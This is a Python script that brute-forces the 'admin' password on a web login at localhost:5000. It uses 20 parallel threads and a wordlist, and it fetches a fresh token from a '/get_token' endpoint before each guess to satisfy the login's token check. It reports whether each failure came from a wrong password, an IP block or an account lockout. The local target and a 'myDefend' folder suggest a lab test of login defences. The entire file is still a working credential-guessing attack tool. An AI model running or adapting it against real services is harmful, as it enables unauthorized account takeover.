import requests
from concurrent.futures import ThreadPoolExecutor
import threading

base_url = "http://localhost:5000"

username = "admin"

found = False
lock = threading.Lock()

session = requests.Session()


def get_token():
    try:
        r = session.get(f"{base_url}/get_token", params={"username": username})
        data = r.json()
        return data.get("token")
    except Exception as e:
        print("[TOKEN ERROR]", e)
        return None


def try_password(password):

    global found

    if found:
        return

    password = password.strip()

    try:

        token = get_token()

        if not token:
            print("[ERROR] Token not received")
            return

        params = {
            "username": username,
            "password": password,
            "token": token
        }

        r = session.get(f"{base_url}/login", params=params, timeout=5)

        response_text = r.text

        if "login successful" in response_text:

            with lock:
                if not found:
                    found = True
                    print("\n[SUCCESS] Password found:", password)

        else:

            if "incorrect" in response_text:
                reason = "wrong password"

            elif "Invalid or missing token" in response_text:
                reason = "token rejected"

            elif "IP temporarily blocked" in response_text:
                reason = "IP blocked"

            elif "Account temporarily locked" in response_text:
                reason = "account locked"

            else:
                reason = "unknown error"

            print(f"[FAIL] {password} | reason: {reason} | HTTP {r.status_code}")

    except requests.exceptions.Timeout:
        print(f"[TIMEOUT] {password}")

    except requests.exceptions.ConnectionError:
        print("[CONNECTION ERROR] Server not reachable")

    except Exception as e:
        print("[UNEXPECTED ERROR]", e)


def main():

    with open("myDefend/passwordsDefend.txt") as f:
        passwords = f.readlines()

    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(try_password, passwords)


if __name__ == "__main__":
    main()